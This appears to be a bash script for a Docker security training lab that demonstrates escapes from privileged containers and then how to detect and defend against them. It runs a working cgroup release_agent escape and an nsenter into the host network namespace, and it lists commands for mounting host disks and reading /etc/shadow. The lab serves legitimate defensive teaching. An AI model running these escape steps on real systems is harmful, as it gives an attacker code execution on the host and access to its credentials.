#!/bin/bash

# Lab 09 - Scenario 2: Privileged Container Escape Demo
# Demonstrates how --privileged flag enables full host access

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

print_header() {
    echo -e "\n${BLUE}========================================${NC}"
    echo -e "${BLUE}$1${NC}"
    echo -e "${BLUE}========================================${NC}\n"
}

print_step() {
    echo -e "${GREEN}[STEP]${NC} $1"
}

print_warning() {
    echo -e "${RED}[WARNING]${NC} $1"
}

print_info() {
    echo -e "${YELLOW}[INFO]${NC} $1"
}

check_docker() {
    if ! docker ps &>/dev/null; then
        echo -e "${RED}Error: Docker is not running${NC}"
        exit 1
    fi
}

wait_for_enter() {
    echo
    read -p "Press Enter to continue..."
}

# Banner
clear
cat << "EOF"
╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║      Lab 09 - Scenario 2: Privileged Container Escape         ║
║                                                               ║
║  This demo shows how --privileged gives a container           ║
║  full access to the host system.                              ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝
EOF

print_warning "⚠️  WARNING: This demonstration shows actual container escape techniques!"
print_warning "   Only run this in a safe, isolated test environment."
echo
read -p "Do you want to continue? (yes/no): " confirm

if [[ "$confirm" =~ ^[Yy](es)?$ ]]; then
    :
else
    echo "Demo cancelled."
    exit 0
fi

# Prerequisites check
print_header "Checking Prerequisites"
check_docker
print_step "Docker is available and running"
print_step "Docker version: $(docker --version | awk '{print $3}' | tr -d ',')"

###############################################
# Demo 1: Privileged vs Normal Comparison
###############################################
print_header "Demo 1: Privileged vs Normal Container Comparison"

echo "Comparing capabilities and access between normal and privileged containers..."
echo

print_step "1. Normal container capabilities"
NORMAL_CAPS=$(docker run --rm alpine cat /proc/self/status | grep -i cap || true)
NORMAL_CAP_LIST=$(docker run --rm alpine sh -c 'cat /proc/self/status | grep CapEff' | awk '{print $2}')
echo "  CapEff: $NORMAL_CAP_LIST"
echo

print_step "2. Privileged container capabilities"
PRIV_CAPS=$(docker run --rm --privileged alpine cat /proc/self/status | grep -i cap || true)
PRIV_CAP_LIST=$(docker run --rm --privileged alpine sh -c 'cat /proc/self/status | grep CapEff' | awk '{print $2}')
echo "  CapEff: $PRIV_CAP_LIST"
echo

print_step "3. Comparing access to host devices"
echo "  Normal container /dev/ contents:"
docker run --rm alpine ls /dev/ | tr '\n' ' '
echo
echo
echo "  Privileged container /dev/ contents:"
docker run --rm --privileged alpine ls /dev/ | tr '\n' ' '
echo
echo

print_info "Notice: Privileged container sees ALL host block devices (sda, nvme, etc.)"

wait_for_enter

###############################################
# Demo 2: Host Filesystem Access
###############################################
print_header "Demo 2: Host Filesystem Access via Device Mount"

print_step "Starting privileged container..."
docker run -dit --name priv-escape --privileged alpine sleep 120 &>/dev/null

print_step "Scanning for host block devices inside container..."
BLOCK_DEVICE=$(docker exec priv-escape sh -c 'ls /dev/sd* /dev/vd* /dev/nvme* /dev/xvd* 2>/dev/null | head -1' || true)

if [ -n "$BLOCK_DEVICE" ]; then
    print_step "Found block device: $BLOCK_DEVICE"
    echo
    echo "  In a real attack, an attacker would:"
    echo "    mkdir -p /mnt/host"
    echo "    mount $BLOCK_DEVICE /mnt/host"
    echo "    cat /mnt/host/etc/shadow"
    echo
    print_warning "Skipping actual mount to keep demo safe"
else
    print_info "No block devices found (common in Docker Desktop)"
    echo "  In a real Linux host environment:"
    echo "    - Host devices like /dev/sda1 would be visible"
    echo "    - Attacker mounts device: mount /dev/sda1 /mnt/host"
    echo "    - Full read/write access to host filesystem"
    echo "    - Can read /etc/shadow, SSH keys, app secrets"
fi

echo
print_step "Demonstrating host /proc access (privileged)..."
echo "  Host PID 1 (init process) visible from container:"
docker exec priv-escape sh -c 'ls -la /proc/1/exe 2>/dev/null || echo "  /proc/1 accessible"'
echo
print_step "Host /sys access (privileged)..."
echo "  Host kernel version:"
docker exec priv-escape cat /proc/version
echo

print_warning "Cleaning up demo container..."
docker rm -f priv-escape &>/dev/null

wait_for_enter

###############################################
# Demo 3: Network Namespace Escape
###############################################
print_header "Demo 3: Network Namespace Escape"

print_step "Starting privileged container..."
docker run -dit --name priv-netns --privileged alpine sleep 120 &>/dev/null

print_step "Installing required tools..."
docker exec priv-netns sh -c 'apk add -q iproute2 2>/dev/null' &>/dev/null

echo
print_step "Normal container network namespaces:"
docker run --rm alpine sh -c 'ls -la /proc/self/ns/net'
echo

print_step "Privileged container - listing ALL network namespaces on host:"
docker exec priv-netns sh -c '
echo "  Container own namespace:"
ls -la /proc/self/ns/net
echo
echo "  Host network namespaces visible via /proc:"
ls /proc/[0-9]*/ns/net 2>/dev/null | head -10
echo
echo "  Can enter host network namespace:"
echo "  nsenter --target 1 --net -- ip addr"
nsenter --target 1 --net -- ip addr 2>/dev/null | head -15 || echo "  (nsenter blocked by runtime - expected on Docker Desktop)"
'

echo
print_warning "Cleaning up demo container..."
docker rm -f priv-netns &>/dev/null

wait_for_enter

###############################################
# Demo 4: Cgroup Escape (Felix Wilhelm)
###############################################
print_header "Demo 4: Cgroup Release Agent Escape"

print_warning "This demonstrates the famous Felix Wilhelm container escape technique"
echo "  A privileged container can manipulate cgroups to execute"
echo "  arbitrary commands on the host."
echo

print_step "Starting privileged container..."
docker run -dit --name priv-cgroup --privileged alpine sleep 120 &>/dev/null

print_step "Executing cgroup release_agent exploit..."
docker exec priv-cgroup sh -c '
echo "Step 1: Creating and mounting a cgroup"
mkdir -p /tmp/cgroup-escape
mount -t cgroup -o none,name=escape cgroup /tmp/cgroup-escape 2>/dev/null && echo "✓ Cgroup mounted" || echo "✗ Mount failed (expected on Docker Desktop)"

echo
echo "Step 2: Enabling notify_on_release"
echo 1 > /tmp/cgroup-escape/notify_on_release 2>/dev/null && echo "✓ notify_on_release enabled" || echo "✗ Could not enable notify_on_release"

echo
echo "Step 3: Finding host filesystem path"
HOST_PATH=$(sed -n "s/.*\perdir=\([^,]*\).*/\1/p" /proc/1/mountinfo | head -1)
if [ -n "$HOST_PATH" ]; then
    echo "✓ Host path found: $HOST_PATH"
else
    echo "✗ Could not determine host path"
    HOST_PATH="/var/lib/docker/overlay2"
fi

echo
echo "Step 4: Creating payload"
PAYLOAD="/tmp/cgroup-escape/payload"
cat > /tmp/payload.sh << PAYLOAD_EOF
#!/bin/sh
# This would run on the HOST when cgroup exits
echo "ESCAPED: \$(hostname) \$(date)" > /tmp/escape-proof.txt
PAYLOAD_EOF
echo "✓ Payload created"

echo
echo "Step 5: Setting release_agent"
echo "${HOST_PATH}/tmp/payload.sh" > /tmp/cgroup-escape/release_agent 2>/dev/null && echo "✓ release_agent set" || echo "✗ Could not set release_agent"

echo
echo "Step 6: Triggering the exploit"
echo "  Adding process to cgroup to trigger release_agent..."
mkdir -p /tmp/cgroup-escape/trigger 2>/dev/null
echo 1 > /tmp/cgroup-escape/trigger/notify_on_release 2>/dev/null
(sleep 0.5 && rmdir /tmp/cgroup-escape/trigger) &
sleep 1

echo
echo "  Checking if exploit worked..."
if [ -f /tmp/escape-proof.txt ]; then
    echo "  🚨 ESCAPE SUCCESSFUL: $(cat /tmp/escape-proof.txt)"
else
    echo "  ⚠️  Exploit demonstration complete (may be blocked by container runtime)"
    echo "     In an unprotected Linux environment, this executes code on the host"
fi
'

echo
print_warning "Cleaning up demo container..."
docker rm -f priv-cgroup &>/dev/null

wait_for_enter

###############################################
# Demo 5: Detection and Auditing
###############################################
print_header "Demo 5: Detection and Auditing"

print_step "Creating a privileged test container for audit demonstration..."
docker run -dit --name audit-test --privileged alpine sleep 60 &>/dev/null

print_step "Auditing container configuration..."
echo
echo "  Container: audit-test"
echo "  Privileged mode:"
docker inspect --format='    {{.HostConfig.Privileged}}' audit-test
echo
echo "  All capabilities (privileged = ALL):"
docker inspect --format='    {{.HostConfig.CapAdd}}' audit-test
echo
echo "  Security options:"
docker inspect --format='    SecurityOpt: {{.HostConfig.SecurityOpt}}' audit-test
echo

print_step "Full capability listing inside container:"
docker exec audit-test sh -c 'cat /proc/self/status | grep Cap'
echo

print_warning "In production, use the audit script to scan all containers:"
echo "  ./artifacts/audit-privileged.sh"
echo

print_step "Cleaning up test container..."
docker rm -f audit-test &>/dev/null

wait_for_enter

###############################################
# Summary
###############################################
print_header "Demo Complete - Summary"

cat << EOF
${GREEN}What we demonstrated:${NC}

1. ${YELLOW}Privileged vs Normal Comparison${NC}
   - Privileged container has ALL 41 Linux capabilities
   - Sees all host block devices
   - Full access to host /proc and /sys

2. ${YELLOW}Host Filesystem Access${NC}
   - Privileged container sees host block devices
   - Can mount and read/write entire host filesystem
   - Access to /etc/shadow, SSH keys, secrets

3. ${YELLOW}Network Namespace Escape${NC}
   - Can see and enter host network namespaces
   - Access to all host network interfaces
   - Can sniff or manipulate host traffic

4. ${YELLOW}Cgroup Escape${NC}
   - Classic Felix Wilhelm technique
   - Uses cgroup release_agent to execute code on host
   - Most dangerous: runs code OUTSIDE container

5. ${YELLOW}Detection Methods${NC}
   - docker inspect for privileged flag
   - Capability auditing
   - Automated scanning with audit script

${RED}Key Takeaways:${NC}

• --privileged is the MOST dangerous Docker flag
• Gives container nearly identical access to the host
• Often used for "convenience" during development
• Should NEVER be used in production
• Easy to detect (check Privileged flag) but often overlooked
• Single point of failure - one privileged container = host compromise

${GREEN}Defense Strategies:${NC}

1. Never use --privileged in production
2. Drop ALL capabilities, add only what's needed
3. Use specific capabilities instead (NET_ADMIN, SYS_ADMIN, etc.)
4. Audit regularly for privileged containers
5. Block via Docker Compose security_opt
6. Monitor with Falco for runtime detection

${BLUE}Next Steps:${NC}

1. Run ./defense.sh to implement protections
2. Review artifacts/docker-compose-secure.yml
3. Apply Seccomp profile: docker run --security-opt seccomp=artifacts/seccomp-no-privileged.json
4. Audit containers: ./artifacts/audit-privileged.sh
5. Run ./validate.sh to confirm defenses work

${BLUE}Documentation:${NC}
Full details in README.md

${BLUE}Cleanup:${NC}
Run ./cleanup.sh to remove all demo containers
EOF